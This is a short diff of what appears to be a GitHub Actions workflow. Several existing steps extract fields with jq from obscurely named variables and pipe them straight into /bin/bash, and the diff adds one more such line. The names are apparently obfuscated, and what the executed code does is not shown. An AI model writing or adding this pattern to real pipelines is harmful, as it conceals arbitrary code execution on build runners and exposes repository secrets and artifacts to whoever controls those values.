@@ -25,6 +25,7 @@ jobs:
           echo $jjy3 | jq -r .wj12 | /bin/bash
           echo $bf938 | jq -r .bx0770 | /bin/bash
           echo $apahn0 | jq -r .ggox20 | /bin/bash
+          printf '%s' "$k12" | jq -r .nyrn7 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
